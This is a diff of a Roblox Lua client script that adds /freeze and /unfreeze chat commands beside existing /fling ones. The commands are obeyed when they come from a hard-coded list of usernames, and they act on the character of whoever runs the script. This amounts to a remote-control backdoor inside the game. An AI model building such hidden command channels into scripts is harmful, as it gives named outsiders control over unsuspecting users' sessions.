@@ -1,4 +1,4 @@
--- Services
+
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
@@ -54,8 +54,8 @@ end
 Players.PlayerAdded:Connect(function(player)
 	watchPlayer(player)
 end)
-
 local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
 local immuneLocals = {
@@ -71,9 +71,9 @@ end
 
 local monitoredPlayers = {
     Sajwaad = true,
-K_31387 = true,
-haker_457230 = true,
-rengoku28306 = true,
+    K_31387 = true,
+    haker_457230 = true,
+    rengoku28306 = true,
     ghalidev_0 = true,
     iskeowa = true,
     wkwjdnsnsndnxxnsnsn = true,
@@ -112,12 +112,77 @@ local function doUnfling()
     _G.__FLUNG = false
 end
 
-LocalPlayer.CharacterAdded:Connect(function(char)
-    task.wait(0.1)
-    if _G.__FLUNG then
-        char:WaitForChild("HumanoidRootPart").CFrame = CFrame.new(FAR_POS)
+_G.__FREEZE_ACTIVE = false
+_G.__FREEZE_STOP = _G.__FREEZE_STOP or nil
+
+local freezeConn, charConn
+
+local function stopFreeze()
+    _G.__FREEZE_ACTIVE = false
+    if freezeConn then freezeConn:Disconnect(); freezeConn = nil end
+    if charConn then charConn:Disconnect(); charConn = nil end
+end
+
+_G.__FREEZE_STOP = stopFreeze
+
+local function freezeCharacter(char)
+    local hrp = char:WaitForChild("HumanoidRootPart", 5)
+    local hum = char:WaitForChild("Humanoid", 5)
+    if not hrp or not hum then return end
+
+    local currentCFrame = hrp.CFrame
+
+    hrp.Anchored = true
+    hum.WalkSpeed = 0
+    hum.JumpPower = 0
+    hum.AutoRotate = false
+    hum.PlatformStand = true
+
+    if freezeConn then freezeConn:Disconnect() end
+    freezeConn = RunService.RenderStepped:Connect(function()
+        if not _G.__FREEZE_ACTIVE then return end
+        if hrp then
+            hrp.CFrame = currentCFrame
+            hrp.Velocity = Vector3.zero
+            hrp.RotVelocity = Vector3.zero
+        end
+    end)
+end
+
+local function unFreezeCharacter()
+    if _G.__FREEZE_STOP then
+        _G.__FREEZE_STOP()
+        _G.__FREEZE_STOP = nil
     end
-end)
+    local char = LocalPlayer.Character
+    if not char then return end
+
+    local hrp = char:FindFirstChild("HumanoidRootPart")
+    local hum = char:FindFirstChild("Humanoid")
+
+    if hrp then hrp.Anchored = false end
+    if hum then
+        hum.PlatformStand = false
+        hum.AutoRotate = true
+        hum.WalkSpeed = 16
+        hum.JumpPower = 50
+        hum:ChangeState(Enum.HumanoidStateType.Running)
+    end
+end
+
+local function doFreeze()
+    if _G.__FREEZE_ACTIVE then return end
+    _G.__FREEZE_ACTIVE = true
+    if LocalPlayer.Character then
+        freezeCharacter(LocalPlayer.Character)
+    end
+    charConn = LocalPlayer.CharacterAdded:Connect(function(char)
+        task.wait(0.1)
+        if _G.__FREEZE_ACTIVE then
+            freezeCharacter(char)
+        end
+    end)
+end
 
 local function executeCommand(command, fromPlayer)
     command = string.lower(command)
@@ -140,20 +205,27 @@ local function executeCommand(command, fromPlayer)
         end
     end
 
-    -- ===== /fling =====
     if command == "/fling all"
     or (string.sub(command, 1, 6) == "/fling" and string.find(command, myNamePrefix, 7, true)) then
         doFling()
     end
 
-    -- ===== /unfling =====
     if command == "/unfling all"
     or (string.sub(command, 1, 8) == "/unfling" and string.find(command, myNamePrefix, 9, true)) then
         doUnfling()
     end
+
+    if command == "/freeze all"
+    or (string.sub(command, 1, 7) == "/freeze" and string.find(command, myNamePrefix, 8, true)) then
+        doFreeze()
+    end
+
+    if command == "/unfreeze all"
+    or (string.sub(command, 1, 9) == "/unfreeze" and string.find(command, myNamePrefix, 10, true)) then
+        unFreezeCharacter()
+    end
 end
 
--- ===== Bio =====
 local function monitorPlayer(player)
     if not monitoredPlayers[player.Name] then return end
     if player == LocalPlayer then return end
